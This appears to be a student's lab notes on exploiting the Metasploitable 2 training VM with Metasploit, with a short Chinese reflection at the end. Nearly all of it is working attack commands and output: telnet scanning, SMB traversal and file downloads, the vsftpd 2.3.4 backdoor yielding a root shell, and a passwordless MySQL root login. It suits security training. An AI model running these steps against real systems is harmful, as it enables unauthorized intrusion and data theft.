   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   auxiliary/scanner/telnet/lantronix_telnet_password                   normal     Lantronix Telnet Password Recovery
   auxiliary/scanner/telnet/lantronix_telnet_version                    normal     Lantronix Telnet Service Banner Detection
   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal     Telnet Service Encyption Key ID Overflow Detection
   auxiliary/scanner/telnet/telnet_login                                normal     Telnet Login Check Scanner
   auxiliary/scanner/telnet/telnet_ruggedcom                            normal     RuggedCom Telnet Password Generator
   auxiliary/scanner/telnet/telnet_version                              normal     Telnet Service Banner Detection
   auxiliary/server/capture/telnet                                      normal     Authentication Capture: Telnet
   exploit/freebsd/ftp/proftp_telnet_iac               2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   exploit/freebsd/telnet/telnet_encrypt_keyid         2011-12-23       great      FreeBSD Telnet Service Encryption Key ID Buffer Overflow
   exploit/linux/ftp/proftp_telnet_iac                 2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   exploit/linux/http/dlink_diagnostic_exec_noauth     2013-03-05       excellent  D-Link DIR-645 / DIR-815 diagnostic.php Command Execution
   exploit/linux/http/dlink_dir300_exec_telnet         2013-04-22       excellent  D-Link Devices Unauthenticated Remote Command Execution
   exploit/linux/telnet/telnet_encrypt_keyid           2011-12-23       great      Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow
   exploit/solaris/telnet/fuser                        2007-02-12       excellent  Sun Solaris Telnet Remote Authentication Bypass Vulnerability
   exploit/solaris/telnet/ttyprompt                    2002-01-18       excellent  Solaris in.telnetd TTYPROMPT Buffer Overflow
   exploit/unix/webapp/dogfood_spell_exec              2009-03-03       excellent  Dogfood CRM spell.php Remote Command Execution
   exploit/windows/proxy/ccproxy_telnet_ping           2004-11-11       average    CCProxy Telnet Proxy Ping Overflow
   exploit/windows/telnet/gamsoft_telsrv_username      2000-07-17       average    GAMSoft TelSrv 1.5 Username Buffer Overflow
   exploit/windows/telnet/goodtech_telnet              2005-03-15       average    GoodTech Telnet Server Buffer Overflow
   payload/cmd/unix/reverse                                             normal     Unix Command Shell, Double Reverse TCP (telnet)
   payload/cmd/unix/reverse_bash_telnet_ssl                             normal     Unix Command Shell, Reverse TCP SSL (telnet)
   payload/cmd/unix/reverse_ssl_double_telnet                           normal     Unix Command Shell, Double Reverse TCP SSL (telnet)
   post/windows/gather/credentials/mremote                              normal     Windows Gather mRemote Saved Password Extraction

** msf exploit(php_cgi_arg_injection) > use auxiliary/scanner/telnet/telnet_version
** msf auxiliary(telnet_version) > show options

Module options (auxiliary/scanner/telnet/telnet_version):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     23               yes       The target port
   THREADS   1                yes       The number of concurrent threads
   TIMEOUT   30               yes       Timeout for the Telnet probe
   USERNAME                   no        The username to authenticate as

** msf auxiliary(telnet_version) > set RHOSTS 192.168.1.107
RHOSTS => 192.168.1.107
** msf auxiliary(telnet_version) > run

[*] 192.168.1.107:23 TELNET _ _ _ _ _ _ ____ \x0a _ __ ___ ___| |_ __
_ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ \x0a| '_ ` _ \ / _ \
__/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \
__) |\x0a| | | | | | __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |
__// __/ \x0a|_| |_| |_|\___|\__\__,_|___/
.__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|\x0a |_|
\x0a\x0a\x0aWarning: Never expose this VM to an untrusted
network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with
msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
** reference
http://www.pax-pentest.net/exploitation/metasploitable-2-port-23-open-telnet/
* 139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
** msf auxiliary(telnet_login) > search smb

Matching Modules
================

   Name                                                            Disclosure Date  Rank       Description
   ----                                                            ---------------  ----       -----------
   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     Microsoft SQL Server NTLM Stealer
   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     Microsoft SQL Server NTLM Stealer - SQLi
   auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal     Oracle SMB Relay Code Execution
   auxiliary/admin/smb/check_dir_file                                               normal     SMB Scanner Check File/Directory Utility
   auxiliary/admin/smb/delete_file                                                  normal     SMB File Delete Utility
   auxiliary/admin/smb/download_file                                                normal     SMB File Download Utility
   auxiliary/admin/smb/list_directory                                               normal     SMB Directory Listing Utility
   auxiliary/admin/smb/psexec_command                                               normal     Microsoft Windows Authenticated Administration Utility
   auxiliary/admin/smb/psexec_ntdsgrab                                              normal     PsExec NTDS.dit And SYSTEM Hive Download Utility
   auxiliary/admin/smb/samba_symlink_traversal                                      normal     Samba Symlink Directory Traversal
   auxiliary/admin/smb/upload_file                                                  normal     SMB File Upload Utility
   auxiliary/docx/word_unc_injector                                                 normal     Microsoft Word UNC Path Injector
   auxiliary/dos/samba/read_nttrans_ea_list                                         normal     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     SAP SOAP EPS_DELETE_FILE File Deletion
   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     Microsoft Plug and Play Service Registry Overflow
   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     Microsoft SRV.SYS Mailslot Write Corruption
   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     Microsoft SRV.SYS Pipe Transaction No Null
   auxiliary/dos/windows/smb/ms09_001_write                                         normal     Microsoft SRV.SYS WriteAndX Invalid DataOffset
   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     Microsoft Windows Browser Pool DoS
   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                     normal     SMB Negotiate SMB2 Dialect Corruption
   auxiliary/fuzzers/smb/smb_create_pipe                                            normal     SMB Create Pipe Request Fuzzer
   auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                    normal     SMB Create Pipe Request Corruption
   auxiliary/fuzzers/smb/smb_negotiate_corrupt                                      normal     SMB Negotiate Dialect Corruption
   auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                    normal     SMB NTLMv1 Login Request Corruption
   auxiliary/fuzzers/smb/smb_tree_connect                                           normal     SMB Tree Connect Request Fuzzer
   auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal     SMB Tree Connect Request Corruption
   auxiliary/scanner/sap/sap_smb_relay                                              normal     SAP SMB Relay Abuse
   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   auxiliary/scanner/smb/pipe_auditor                                               normal     SMB Session Pipe Auditor
   auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal     SMB Session Pipe DCERPC Auditor
   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     Microsoft Windows Authenticated Logged In Users Enumeration
   auxiliary/scanner/smb/smb2                                                       normal     SMB 2.0 Protocol Detection
   auxiliary/scanner/smb/smb_enumshares                                             normal     SMB Share Enumeration
   auxiliary/scanner/smb/smb_enumusers                                              normal     SMB User Enumeration (SAM EnumUsers)
   auxiliary/scanner/smb/smb_enumusers_domain                                       normal     SMB Domain User Enumeration
   auxiliary/scanner/smb/smb_login                                                  normal     SMB Login Check Scanner
   auxiliary/scanner/smb/smb_lookupsid                                              normal     SMB SID User Enumeration (LookupSid)
   auxiliary/scanner/smb/smb_version                                                normal     SMB Version Detection
   auxiliary/scanner/snmp/snmp_enumshares                                           normal     SNMP Windows SMB Share Enumeration
   auxiliary/server/capture/smb                                                     normal     Authentication Capture: SMB
   auxiliary/server/http_ntlmrelay                                                  normal     HTTP Client MS Credential Relayer
   auxiliary/spoof/nbns/nbns_response                                               normal     NetBIOS Name Service Spoofer
   exploit/linux/samba/chain_reply                                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/multi/ids/snort_dce_rpc                                 2007-02-19       good       Snort 2 DCE/RPC Preprocessor Buffer Overflow
   exploit/netware/smb/lsass_cifs                                  2007-01-21       average    Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
   exploit/osx/browser/safari_file_policy                          2011-10-12       normal     Apple Safari file:// Arbitrary Code Execution
   exploit/windows/browser/java_ws_arginject_altjvm                2010-04-09       excellent  Sun Java Web Start Plugin Command Line Argument Injection
   exploit/windows/browser/java_ws_double_quote                    2012-10-16       excellent  Sun Java Web Start Double Quote Injection
   exploit/windows/browser/java_ws_vmargs                          2012-02-14       excellent  Sun Java Web Start Plugin Command Line Argument Injection
   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32           2010-02-26       great      MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   exploit/windows/fileformat/ms13_071_theme                       2013-09-10       excellent  MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   exploit/windows/fileformat/ms14_060_sandworm                    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
   exploit/windows/fileformat/ursoft_w32dasm                       2005-01-24       good       URSoft W32Dasm Disassembler Function Buffer Overflow
   exploit/windows/fileformat/vlc_smb_uri                          2009-06-24       great      VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
   exploit/windows/oracle/extjob                                   2007-01-01       excellent  Oracle Job Scheduler Named Pipe Command Execution
   exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       excellent  GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   exploit/windows/smb/ms03_049_netapi                             2003-11-11       good       MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   exploit/windows/smb/ms04_007_killbill                           2004-02-10       low        MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   exploit/windows/smb/ms04_011_lsass                              2004-04-13       good       MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   exploit/windows/smb/ms04_031_netdde                             2004-10-12       good       MS04-031 Microsoft NetDDE Service Overflow
   exploit/windows/smb/ms05_039_pnp                                2005-08-09       good       MS05-039 Microsoft Plug and Play Service Overflow
   exploit/windows/smb/ms06_025_rasmans_reg                        2006-06-13       good       MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   exploit/windows/smb/ms06_025_rras                               2006-06-13       average    MS06-025 Microsoft RRAS Service Overflow
   exploit/windows/smb/ms06_040_netapi                             2006-08-08       good       MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   exploit/windows/smb/ms06_066_nwapi                              2006-11-14       good       MS06-066 Microsoft Services nwapi32.dll Module Exploit
   exploit/windows/smb/ms06_066_nwwks                              2006-11-14       good       MS06-066 Microsoft Services nwwks.dll Module Exploit
   exploit/windows/smb/ms06_070_wkssvc                             2006-11-14       manual     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   exploit/windows/smb/ms07_029_msdns_zonename                     2007-04-12       manual     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
   exploit/windows/smb/ms08_067_netapi                             2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption
   exploit/windows/smb/ms09_050_smb2_negotiate_func_index          2009-09-07       good       MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   exploit/windows/smb/ms10_061_spoolss                            2010-09-14       excellent  MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   exploit/windows/smb/netidentity_xtierrpcpipe                    2009-04-06       great      Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   exploit/windows/smb/psexec                                      1999-01-01       manual     Microsoft Windows Authenticated User Code Execution
   exploit/windows/smb/psexec_psh                                  1999-01-01       manual     Microsoft Windows Authenticated Powershell Command Execution
   exploit/windows/smb/smb_relay                                   2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Execution
   exploit/windows/smb/timbuktu_plughntcommand_bof                 2009-06-25       great      Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   post/linux/gather/mount_cifs_creds                                               normal     Linux Gather Saved mount.cifs/mount.smbfs Credentials
   post/windows/escalate/droplnk                                                    normal     Windows Escalate SMB Icon LNK Dropper
   post/windows/gather/credentials/gpp                                              normal     Windows Gather Group Policy Preference Saved Passwords
   post/windows/gather/enum_shares                                                  normal     Windows Gather SMB Share Enumeration via Registry
   post/windows/gather/netlm_downgrade                                              normal     Windows NetLM Downgrade Attack
   post/windows/gather/word_unc_injector                                            normal     Windows Gather Microsoft Office Word UNC Path Injector
** msf auxiliary(telnet_login) > use auxiliary/admin/smb/
use auxiliary/admin/smb/check_dir_file
use auxiliary/admin/smb/delete_file
use auxiliary/admin/smb/download_file
use auxiliary/admin/smb/list_directory
use auxiliary/admin/smb/psexec_command
use auxiliary/admin/smb/psexec_ntdsgrab
use auxiliary/admin/smb/samba_symlink_traversal
use auxiliary/admin/smb/upload_file
** msf auxiliary(telnet_login) > use auxiliary/admin/smb/list_directory
** msf auxiliary(list_directory) > show options

Module options (auxiliary/admin/smb/list_directory):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOST                      yes       The target address
   RPATH                      no        The name of the remote directory relative to the share
   RPORT     445              yes       Set the SMB service port
   SMBSHARE  C$               yes       The name of a writeable share on the server

** msf auxiliary(list_directory) > set RHOST 192.168.1.107
RHOST => 192.168.1.107
** msf auxiliary(list_directory) > set smbshare tmp
smbshare => tmp
** msf auxiliary(list_directory) > run

[*] Connecting to the server...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Directory Listing of \\192.168.1.107\tmp\
=========================================

  SIZE  TYPE  TIME                   FILENAME
  ----  ----  ----                   --------
  0 B   D     2012-05-21 02:05:07AM  ..
  0 B   D     2014-10-24 11:10:48AM  .ICE-unix
  0 B   D     2014-10-24 11:10:48AM  .X11-unix
  0 B   F     2014-10-24 11:10:48AM  4553.jsvc_up
  11 B  F     2014-10-24 11:10:48AM  .X0-lock
  0 B   D     2014-10-24 18:10:31PM  orbit-msfadmin
  0 B   D     2014-10-24 18:10:31PM  gconfd-msfadmin
  0 B   D     2014-10-24 22:10:54PM  .
** msf auxiliary(list_directory) > show options

Module options (auxiliary/admin/smb/list_directory):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOST     192.168.1.107    yes       The target address
   RPATH     .                no        The name of the remote directory relative to the share
   RPORT     139              yes       Set the SMB service port
   SMBSHARE  tmp              yes       The name of a writeable share on the server

** msf auxiliary(list_directory) > set RPATH /
RPATH => /
** msf auxiliary(list_directory) > run

[*] Connecting to the server...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Listing \\192.168.1.107\tmp\/'...
[*] Directory Listing of \\192.168.1.107\tmp\/
==========================================

  SIZE  TYPE  TIME                   FILENAME
  ----  ----  ----                   --------
  0 B   D     2012-05-21 02:05:07AM  rootfs
  0 B   D     2012-05-21 02:05:07AM  ..
  0 B   D     2014-10-24 11:10:48AM  .ICE-unix
  11 B  F     2014-10-24 11:10:48AM  .X0-lock
  0 B   D     2014-10-24 11:10:48AM  .X11-unix
  0 B   F     2014-10-24 11:10:48AM  4553.jsvc_up
  0 B   D     2014-10-24 18:10:31PM  orbit-msfadmin
  0 B   D     2014-10-24 18:10:31PM  gconfd-msfadmin
  0 B   D     2014-10-24 22:10:22PM  .

[*] Auxiliary module execution completed
** msf auxiliary(list_directory) > set RPATH rootfs
RPATH => rootfs
** msf auxiliary(list_directory) > run

[*] Connecting to the server...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Listing \\192.168.1.107\tmp\rootfs'...
[*] Directory Listing of \\192.168.1.107\tmp\rootfs
===============================================

  SIZE    TYPE  TIME                   FILENAME
  ----    ----  ----                   --------
  1.9 MB  F     2008-04-11 00:04:36AM  vmlinuz
  0 B     D     2010-03-17 06:03:06AM  srv
  0 B     D     2010-03-17 06:03:06AM  initrd
  0 B     D     2010-03-17 06:03:06AM  opt
  0 B     D     2010-03-17 06:03:56AM  cdrom
  0 B     D     2010-03-17 06:03:56AM  lost+found
  0 B     D     2010-03-17 06:03:56AM  media
  0 B     D     2010-03-17 22:03:12PM  var
  0 B     D     2010-04-16 14:04:58PM  home
  0 B     D     2010-04-28 12:04:12PM  usr
  0 B     D     2010-04-29 04:04:34AM  mnt
  0 B     D     2012-05-14 09:05:54AM  sbin
  0 B     D     2012-05-14 11:05:07AM  boot
  0 B     D     2012-05-14 11:05:07AM  bin
  0 B     D     2012-05-14 11:05:07AM  lib
  7.6 MB  F     2012-05-14 11:05:08AM  initrd.img
  0 B     D     2012-05-21 02:05:07AM  ..
  0 B     D     2012-05-21 02:05:07AM  .
  0 B     D     2014-10-24 11:10:48AM  dev
  0 B     D     2014-10-24 11:10:48AM  proc
  11 KB   F     2014-10-24 11:10:48AM  nohup.out
  0 B     D     2014-10-24 11:10:48AM  root
  0 B     D     2014-10-24 11:10:48AM  sys
  0 B     D     2014-10-24 22:10:22PM  tmp
  0 B     D     2014-10-24 22:10:32PM  etc

[*] Auxiliary module execution completed
** msf auxiliary(list_directory) > show options

Module options (auxiliary/admin/smb/list_directory):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOST     192.168.1.107    yes       The target address
   RPATH     rootfs           no        The name of the remote directory relative to the share
   RPORT     139              yes       Set the SMB service port
   SMBSHARE  tmp              yes       The name of a writeable share on the server

** msf auxiliary(list_directory) > set RPATH rootfs/home
RPATH => rootfs/home
** msf auxiliary(list_directory) > run

[*] Connecting to the server...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Listing \\192.168.1.107\tmp\rootfs/home'...
[*] Directory Listing of \\192.168.1.107\tmp\rootfs/home
====================================================

  SIZE  TYPE  TIME                   FILENAME
  ----  ----  ----                   --------
  0 B   D     2010-03-17 22:03:12PM  ftp
  0 B   D     2010-04-16 14:04:58PM  .
  0 B   D     2010-04-16 14:04:58PM  service
  0 B   D     2010-05-08 02:05:00AM  user
  0 B   D     2012-05-21 02:05:07AM  ..
  0 B   D     2014-10-24 11:10:48AM  msfadmin

[*] Auxiliary module execution completed
** msf auxiliary(list_directory) > set RPATH rootfs/home/msfadmin
RPATH => rootfs/home/msfadmin
** msf auxiliary(list_directory) > run

[*] Connecting to the server...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Listing \\192.168.1.107\tmp\rootfs/home/msfadmin'...
[*] Directory Listing of \\192.168.1.107\tmp\rootfs/home/msfadmin
=============================================================

  SIZE    TYPE  TIME                   FILENAME
  ----    ----  ----                   --------
  0 B     F     2010-03-17 06:03:06AM  .bash_history
  0.6 KB  F     2010-03-17 07:03:25AM  .profile
  0 B     D     2010-04-16 14:04:58PM  ..
  0 B     D     2010-04-18 02:04:36AM  .distcc
  0 B     D     2010-04-28 11:04:43AM  vulnerable
  0 B     F     2010-05-08 02:05:00AM  .sudo_as_admin_successful
  0 B     D     2010-05-18 09:05:47AM  .ssh
  4 KB    F     2012-05-14 14:05:27PM  .mysql_history
  4 B     F     2012-05-21 02:05:48AM  .rhosts
  0 B     D     2014-10-24 11:10:48AM  .
  0 B     F     2014-10-24 11:10:48AM  .Xauthority
  0 B     D     2014-10-24 18:10:31PM  .gconfd
  0 B     D     2014-10-24 18:10:31PM  .gconf

[*] Auxiliary module execution completed
** msf auxiliary(list_directory) > use auxiliary/admin/smb/download_file
** msf auxiliary(download_file) > show options

Module options (auxiliary/admin/smb/download_file):

   Name       Current Setting                     Required  Description
   ----       ---------------                     --------  -----------
   RHOST      192.168.1.107                       yes       The target address
   RPATH      rootfs/home/msfadmin/.bash_history  yes       The name of the remote file relative to the share
   RPORT      139                                 yes       Set the SMB service port
   SMBDomain  WORKGROUP                           no        The Windows domain to use for authentication
   SMBPass                                        no        The password for the specified username
   SMBSHARE   tmp                                 yes       The name of a share on the RHOST
   SMBUser                                        no        The username to authenticate as

** msf auxiliary(download_file) > run

[*] Connecting to the 192.168.1.107:139...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Trying to download rootfs/home/msfadmin/.bash_history...
[+] rootfs/home/msfadmin/.bash_history saved as: /home/ice/.msf4/loot/20141024230940_youknow_192.168.1.107_smb.shares.file_950081.bin
[*] Auxiliary module execution completed
** msf auxiliary(upload_file) > use auxiliary/admin/smb/download_file
** msf auxiliary(download_file) > show options

Module options (auxiliary/admin/smb/download_file):

   Name       Current Setting                     Required  Description
   ----       ---------------                     --------  -----------
   RHOST      192.168.1.107                       yes       The target address
   RPATH      rootfs/home/msfadmin/.bash_history  yes       The name of the remote file relative to the share
   RPORT      139                                 yes       Set the SMB service port
   SMBDomain  WORKGROUP                           no        The Windows domain to use for authentication
   SMBPass                                        no        The password for the specified username
   SMBSHARE   tmp                                 yes       The name of a share on the RHOST
   SMBUser                                        no        The username to authenticate as

** msf auxiliary(download_file) > set RPATH rootfs/var/www/index.php
RPATH => rootfs/var/www/index.php
** msf auxiliary(download_file) > run

[*] Connecting to the 192.168.1.107:139...
[*] Mounting the remote share \\192.168.1.107\tmp'...
[*] Trying to download rootfs/var/www/index.php...
[+] rootfs/var/www/index.php saved as: /home/ice/.msf4/loot/20141024232027_youknow_192.168.1.107_smb.shares.file_118862.php
[*] Auxiliary module execution completed
** reference
http://www.pax-pentest.net/exploitation/metasploitable-2-samba-server/
* 21/tcp   open  ftp         vsftpd 2.3.4
  | _ftp-anon: Anonymous FTP login allowed (FTP code 230) |
** msf auxiliary(download_file) > search vsftpd

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
** msf auxiliary(download_file) > use exploit/unix/ftp/vsftpd_234_backdoor
** msf exploit(vsftpd_234_backdoor) > show payloads

Compatible Payloads
===================

   Name               Disclosure Date  Rank    Description
   ----               ---------------  ----    -----------
   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection

** msf exploit(vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact
** msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


** msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.1.107
RHOST => 192.168.1.107
** msf exploit(vsftpd_234_backdoor) > run

[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 8 opened (192.168.1.103:57705 -> 192.168.1.107:6200) at 2014-10-24 23:27:17 +0800

*** ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
*** whoami
root

** reference
http://www.pax-pentest.net/exploitation/metasploitable-2-exploiting-ftp-server-vsftpd-backdoor/
* 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
  | mysql-info: Protocol: 10
  | Version: 5.0.51a-3ubuntu5
  | Thread ID: 10
  | Some Capabilities: Connect with DB, Compress, SSL, Transactions, Secure Connection
  | Status: Autocommit
  |_Salt: n^j|OWE6{-kS?")FgREE
** mysql -h 192.168.1.107 -uroot -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Copyright (c) 2000, 2013, Oracle, Monty Program Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
** reference
http://www.pax-pentest.net/exploitation/metasploitable-2-port-3306-mysql/
* sumary
  現實當中，一定沒有這麼簡單的案例。
  不過，通過這個教程的學習，讓我知道了每個端口都是一個服務。都是有可能利用進入系統的。
不僅僅是只有80端口。掃出端口號之後，確定服務的版本信息，然後去搜索有沒有cve信息。
  而msf的流程是
1.search <服務的名字>
2.use path/to/service-name
3.show options
4.set option value
5.run
 估計實際當中也不會這麼簡單了。
